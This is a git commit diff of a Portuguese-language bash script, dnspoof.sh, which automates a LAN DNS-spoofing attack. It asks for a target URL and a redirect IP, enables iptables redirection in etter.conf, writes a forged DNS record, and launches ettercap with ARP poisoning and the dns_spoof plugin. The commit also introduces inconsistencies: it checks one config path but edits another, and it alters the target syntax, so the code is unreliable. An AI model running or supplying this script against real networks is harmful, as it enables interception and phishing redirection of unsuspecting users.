b6359df9bda333ee9c3f0ef890222d7afb553799
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2024-11-28 11:43:39 -0300

    Update dnspoof.sh

--- dnspoof.sh
+++ dnspoof.sh
@@ -1,24 +1,17 @@
 #!/bin/bash
 
-# Exibe o banner
-echo "  _____           _  _____           "
-echo " |  __ \         | |/ ____|          "
-echo " | |  | | ___  __| | (___   ___  ___ "
-echo " | |  | |/ _ \/ _' |\___ \ / _ \/ __|"
-echo " | |__| |  __/ (_| |____) |  __/ (__ "
-echo " |_____/ \___|\__,_|_____/ \___|\___|"
-echo "                                     "
-
+                                     
 # Solicita a entrada do usuário para URL, IP local e interface de rede
 read -p "Digite a URL que deseja redirecionar: " url
 read -p "Digite o IP local para onde deseja redirecionar: " iplocal
 read -p "Digite a interface de rede (exemplo: eth0, wlan0): " iface
 
 # Verifica se o etter.conf existe e descomenta a linha que permite o redirecionamento
-if [ -f /usr/local/etc/etter.conf ]; then
+if [ -f /etc/etter.conf ]; then
+    echo "se erros persistirem descomente os redir_comand no /etc/etter.conf"
     sed -i 's/#redir_command_on = \"iptables/redir_command_on = \"iptables/g' /usr/local/etc/etter.conf
     sed -i 's/#redir_command_off = \"iptables/redir_command_off = \"iptables/g' /usr/local/etc/etter.conf
-    echo "Linhas de redirecionamento descomentadas em /usr/local/etc/etter.conf"
+    echo "Linhas de redirecionamento descomentadas em /etc/etter.conf"
 else
     echo "Arquivo etter.conf não encontrado!"
     exit 1
@@ -29,4 +22,4 @@ echo "$url A $iplocal" >> /usr/local/share/etter.dns
 echo "Redirecionamento DNS adicionado ao arquivo /usr/local/share/etter.dns"
 
 # Executa o ettercap com as opções fornecidas
-ettercap -T -Q -i "$iface" -M arp -P dns_spoof // //
+ettercap -T -Q -i "$iface" -M arp -P dns_spoof ////
